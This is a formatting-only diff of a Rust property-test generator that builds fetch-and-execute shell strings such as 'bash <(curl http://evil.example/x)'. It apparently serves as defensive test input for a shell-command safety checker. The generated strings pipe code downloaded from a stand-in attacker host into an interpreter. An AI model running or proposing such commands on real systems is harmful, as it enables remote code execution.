@@ -636,16 +636,10 @@ pub fn bash_process_subst() -> impl Strategy<Value = String> {
 /// (`bash <(curl …)`). Used to pin legacy/DSL remote-pipe parity for
 /// ADR 0003 hole C.
 pub fn bash_process_subst_remote_pipe() -> impl Strategy<Value = String> {
-    let interp = prop_oneof![
-        Just("bash"),
-        Just("sh"),
-        Just("zsh"),
-        Just("python3"),
-    ];
+    let interp = prop_oneof![Just("bash"), Just("sh"), Just("zsh"), Just("python3"),];
     let fetcher = prop_oneof![Just("curl"), Just("wget"), Just("fetch")];
-    (interp, fetcher).prop_map(|(interp, fetcher)| {
-        format!("{interp} <({fetcher} http://evil.example/x)")
-    })
+    (interp, fetcher)
+        .prop_map(|(interp, fetcher)| format!("{interp} <({fetcher} http://evil.example/x)"))
 }
 
 /// Combined short-option wrapper (`bash -lc 'X'`, `sh -ec 'X'`,
